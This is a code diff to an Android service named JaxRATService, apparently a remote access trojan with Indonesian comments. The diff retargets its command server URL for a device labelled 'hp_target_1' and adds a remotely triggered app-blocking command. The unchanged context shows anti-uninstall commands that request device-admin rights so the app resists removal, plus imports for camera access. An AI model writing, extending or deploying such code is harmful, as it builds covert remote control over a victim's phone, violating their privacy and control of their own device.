@@ -10,6 +10,7 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.hardware.camera2.CameraAccessException;
@@ -37,7 +38,7 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 
 public class JaxRATService extends Service {
-    private static final String SERVER_URL = "http://192.168.1.20:5000"; // SESUAIKAN IP
+    private static final String SERVER_URL = "http://192.168.1.23:5000"; // SESUAIKAN IP
     private static final String DEVICE_ID = "hp_target_1"; 
     private static final String CHANNEL_ID = "JaxRAT_Channel";
     
@@ -145,8 +146,16 @@ public class JaxRATService extends Service {
             aktifkanAdmin();
         } else if (cmd.equals("anti_uninstall_off")) {
             matikanAdmin();
+        } else if (cmd.startsWith("block_apps|")) {
+            // LOGIKA APP BLOCKER DITARUH DI DALAM SINI
+            String[] parts = cmd.split("\\|");
+            if (parts.length >= 2) {
+                SharedPreferences prefs = getSharedPreferences("JaxPrefs", MODE_PRIVATE);
+                prefs.edit().putString("blocked_apps", parts[1]).apply();
+                showToast("App Blocker Updated!");
+            }
         }
-    }
+    } // <--- KURUNG KURAWAL PENUTUP executeCommand
 
     private void aktifkanAdmin() {
         ComponentName adminComponent = new ComponentName(this, JaxAdminReceiver.class);
@@ -156,7 +165,7 @@ public class JaxRATService extends Service {
             Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan perlindungan JaxRAT.");
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // Flag agar bisa dibuka dari background
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
         } else {
             showToast("Admin sudah aktif!");
